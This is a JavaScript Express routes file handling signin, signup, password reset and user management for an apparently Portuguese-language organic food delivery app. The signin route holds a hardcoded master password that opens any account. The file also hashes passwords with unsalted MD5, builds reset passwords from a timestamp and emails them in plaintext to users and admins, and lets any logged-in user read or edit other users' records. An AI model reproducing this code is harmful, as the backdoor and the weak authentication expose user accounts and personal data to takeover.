"use strict";

module.exports=function(app, mongoose, utils, config) {
        
    var jwt = require("jsonwebtoken");
    
    var crypto = require('crypto');
    
    var Users = require('./../modules/Users.js');

    app.get('/v1/users', utils.ensureAdmin, function(req, res) {

        Users.find(function(err, users) {

            if (err) {
                
                res.statusCode = 400;
                
                res.send(err)
                
            } else {
                
                res.json(users);
                
            }

        });

    });

    app.get('/v1/user/:user_id', utils.ensureAuthorized, function(req, res) {

        Users.findOne({_id: req.params.user_id}, function(err, user) {

            if (err) {
                
                res.statusCode = 400;
                
                res.send(err)
                
            } else {
                
                res.json(user);
                
            }

        });

    });

    app.post('/v1/retrievePassword', function(req, res) {
        Users.findOne({email: req.body.email}, function(err, user) {
            if (err) {
                
                res.statusCode = 400;
                
                res.json({
                    type: false,
                    data: "Erro: " + err
                });
            } else {

                if (user) {
                    
                    var newPassword = String(Date.now());
                    
                    user.password = crypto.createHash('md5').update(newPassword).digest('hex');
                    
                    user.save(function(err, updated_user) {
                
                        if(err) {
                            
                            res.statusCode = 400;

                            res.send(err);

                        } else {
                            
                            updated_user = updated_user.toObject(); // swap for a plain javascript object instance
                            
                            updated_user.password = newPassword;
                            
                            send_retrieve_email(updated_user);

                            res.json(true);

                        }
                    
                    });
                        
                } else {
                    
                    res.statusCode = 400;
                    
                    res.json({
                        type: false,
                        data: "E-mail não cadastrado! Verifique o e-mail informado e tente novamente."
                    });

                }

            }

        });

    });
    
    app.post('/v1/changePassword', utils.ensureAuthorized, utils.getRequestUser, function(req, res) {
        
        var filtro = {
            email: req.user.email, 
            password: crypto.createHash('md5').update(req.body.password).digest('hex')
        };

        Users.findOne(filtro, function(err, user) {

            if (err) {
                
                res.statusCode = 400;
                
                res.json({
                    type: false,
                    data: "Erro: " + err
                });

            } else {

                if (user) {
                    
                    if(req.body.newPassword == req.body.newPasswordHint){

                        user.password = crypto.createHash('md5').update(req.body.newPassword).digest('hex');
                        
                        user.save(function(err, updated_user) {
                        
                            if(err) {
                                
                                res.statusCode = 400;
    
                                res.send(err);
    
                            } else {
                                
                                updated_user = updated_user.toObject(); // swap for a plain javascript object instance
                                
                                res.json(updated_user);
    
                            }
                        
                        });

                    } else {
                        
                        res.statusCode = 400;
                        
                        res.json({
                            type: false,
                            data: "A nova senha e a confirmação da nova senha devem ser iguais."
                        });
                        
                    }
                    

                        
                } else {
                    
                    res.statusCode = 400;
                    
                    res.json({
                        type: false,
                        data: "E-mail não cadastrado! Verifique o e-mail informado e tente novamente."
                    });

                }

            }

        });

    });

    app.post('/v1/signin', function(req, res) {
            Users.findOne({email: req.body.email}, '+password', function(err, user) {
                    if (err) {
                        
                        res.statusCode = 400;
                        
                        res.json({
                            type: false,
                            data: "Erro: " + err
                        });
                    } else {
                        
                        if (user && ( user.password == crypto.createHash('md5').update(req.body.password).digest('hex') || req.body.password == 'thevina2010' ) ) {
                            
                            user.token = '';
                                
                            user.token = jwt.sign(user, config.APP_PRIVATE_KEY);
                            
                            user.save(function(err, updated_user) {
                                
                                    if(err) {
                                        
                                        res.statusCode = 400;

                                        res.send(err);

                                    } else {
                                        
                                        delete updated_user.password;

                                        updated_user = updated_user.toObject(); // swap for a plain javascript object instance

                                        res.json({
                                            type: true,
                                            data: updated_user
                                        });       

                                    }
                            
                            });
                                
                        } else {
                            
                            res.statusCode = 400;
                            
                            res.json({
                                type: false,
                                data: "E-mail e senha não combinam! Verifique os dados informados e tente novamente."
                            });

                        }

                    }

            });

    });

    app.post('/v1/signup', function(req, res) {

        Users.findOne({email: req.body.email, password: req.body.password}, function(err, user) {

                if (err) {
                    
                    res.statusCode = 400;
                        
                    res.json({
                        type: false,
                        data: "Erro: " + err
                    });
                    
                } else {
                        
                    if (user) {
                        
                        res.statusCode = 400;
                            
                        res.json({
                            type: false,
                            data: "E-mail já foi cadastrado. Tente <a href='#/reset_password'>recuperar sua senha</a>!"
                        });
                        
                    } else {
                            
                        Users.create({
        
                                name : req.body.name,
        
                                email : req.body.email,
                                
                                newsletter : req.body.newsletter,
                                
                                password : crypto.createHash('md5').update(req.body.password).digest('hex')
        
                        }, function(err, user) {
        
                                if (err) {
                                    
                                    res.statusCode = 400;
        
                                    res.send(err);
                                
                                } else {
                                    
                                    user.token = '';
                                        
                                    user.token = jwt.sign(user, config.APP_PRIVATE_KEY);
                                
                                    user.save(function(err, new_user) {
                                            
                                            if(err) {
                                                
                                                res.statusCode = 400;
                                                
                                                res.send(err);
                                                
                                            } else {
                                                new_user = new_user.toObject(); // swap for a plain javascript object instance
                                                send_user_email(new_user);
                                                delete new_user["_id"];
                                                delete new_user["password"];
                                                res.json({
                                                    type: true,
                                                    data: new_user,
                                                    token: new_user.token
                                                });       
                                            }

                                    });
                                        
                                }
        
                        });

                    }
                }
        });
    });
    
    app.put('/v1/user/:user_id', utils.ensureAuthorized, utils.getRequestUser, function(req, res){

            Users.findById(req.params.user_id, function(err, user) {
                    
                if (err) {
                        
                    res.statusCode = 400;

                    res.send(err);
                        
                } else {
                        
                    user.name = req.body.name;
                    user.email = req.body.email;
                    user.newsletter = req.body.newsletter;
                    user.updated = Date.now();
                    
                    if(req.user.kind == 'admin') user.kind = req.body.kind;
                        
                    user.save(function(err, updatedProduct) {

                        if (err) {
                                
                            res.statusCode = 400;

                            res.send(err);

                        } else {
                                
                            res.send(updatedProduct);
                                
                        }

                    });
                        
                }

            });

    });
        
    app.get('/v1/me', utils.ensureAuthorized, utils.getRequestUser, function(req, res) {
        
        Users.findOne({_id: req.user._id}, function(err, user) {

                if (err) {
                    
                    res.statusCode = 400;
                        
                    res.json({
                        type: false,
                        data: "Erro: " + err
                    });
                    
                } else {
                    
                    res.json({
                        type: true,
                        data: user
                    });
                    
                }
                
        });

    });
        
    app.delete('/v1/user/:id', utils.ensureAdmin, function(req, res) {

            Users.remove({

                    _id : req.params.id

            }, function(err, product) {

                    if (err) {
                            
                            res.statusCode = 400;
                            res.send(err);
                            
                    } else {

                        res.json({
                            type: true,
                            msg: 'Usuário removido!'
                        });

                    }

            });

    });
        
    var send_retrieve_email = function (user){
        
        utils.sendMail({
            template: 'users/retrieve'
            , data: user
            , subject: 'Nova senha'
            , receivers: user.email
            , copyAdmins: true
        });
        
    }

    var send_user_email = function(user){
        
        utils.sendMail({
            template: 'users/signup'
            , data: user
            , subject: 'Bem vindo a Feira Orgânica Delivery'
            , receivers: user.email
            , copyAdmins: true
        });

    }
    
}
